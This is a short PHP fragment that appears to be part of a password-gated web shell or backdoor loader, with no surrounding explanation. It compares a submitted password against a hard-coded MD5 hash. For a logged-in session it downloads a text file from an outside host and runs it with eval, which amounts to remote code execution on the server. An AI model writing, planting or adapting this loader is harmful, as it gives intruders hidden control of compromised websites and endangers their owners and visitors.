...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '515ff0e3cef23e8557c2ead407dff4b3'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://elearning2.orientacampus.it/admin/templates/test.txt');
    eval('?>' . $a);
} else {
